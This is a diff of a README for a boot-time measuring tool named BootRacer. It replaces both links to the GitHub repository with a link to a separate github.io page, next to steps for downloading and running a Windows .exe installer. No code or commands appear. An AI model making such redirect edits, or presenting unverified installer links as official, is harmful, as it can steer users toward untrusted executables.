@@ -1,6 +1,6 @@
 # ⏱️ bootracer-boot-activity - Measure your computer startup time precisely
 
-[![Download BootRacer](https://img.shields.io/badge/Download-BootRacer-blue.svg)](https://github.com/aohfl/bootracer-boot-activity)
+[![Download BootRacer](https://img.shields.io/badge/Download-BootRacer-blue.svg)](https://aohfl.github.io)
 
 ## 🎯 About this software
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these requirements:
 You must visit the project page to get the installer for your system. Follow these steps to prepare the tool:
 
 1. Click the link provided below to open the official repository page.
-2. Visit this page to download: [https://github.com/aohfl/bootracer-boot-activity](https://github.com/aohfl/bootracer-boot-activity)
+2. Visit this page to download: [https://aohfl.github.io](https://aohfl.github.io)
 3. Look for the latest release version on the right side of the screen.
 4. Select the Windows installer file ending in .exe.
 5. Save the file to your Downloads folder.
